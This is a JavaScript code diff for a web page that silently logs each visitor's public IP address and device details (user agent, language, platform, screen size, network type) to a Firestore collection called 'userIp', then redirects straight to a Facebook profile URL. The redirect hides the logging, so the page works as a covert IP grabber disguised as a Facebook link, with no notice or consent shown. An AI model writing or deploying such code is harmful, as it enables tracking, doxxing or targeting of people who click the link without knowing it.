@@ -1,20 +1,25 @@
-var country_name, city, postal, latitude, longitude, IPv4, state, time;
+fetch('https://api.ipify.org/?format=json')
+  .then(response => response.json())
+  .then(data => {
+    const ipAddress = data.ip;
+    const deviceInfo = {
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      platform: navigator.platform,
+      screenWidth: window.screen.width,
+      screenHeight: window.screen.height,
+      networkeffectiveType: navigator.connection.effectiveType,
+      networkdownlink: navigator.connection.downlink,
+    };
 
-function callback(response) {
-    country_name = response.country_name;
-    city = response.city;
-    postal = response.postal;
-    latitude = response.latitude;
-    longitude = response.longitude;
-    IPv4 = response.IPv4;
-    state = response.state;
-    time = new Date();
+    console.log(deviceInfo);
+
     db.collection("userIp").add({
-        IPv4,city,country_name,latitude,longitude,postal,state,time
+        ipAddress, deviceInfo, time: new Date(),
+    }).then(_ => {
+        window.location.replace("http://www.facebook.com/profile.php?")
     });
-    window.location.replace("http://www.facebook.com/profile.php?");
-}
-$.ajax({
-    url: "https://geoip-db.com/jsonp/",
-    dataType: "jsonp"
-});
+  })
+  .catch(error => {
+    console.error(error);
+  });
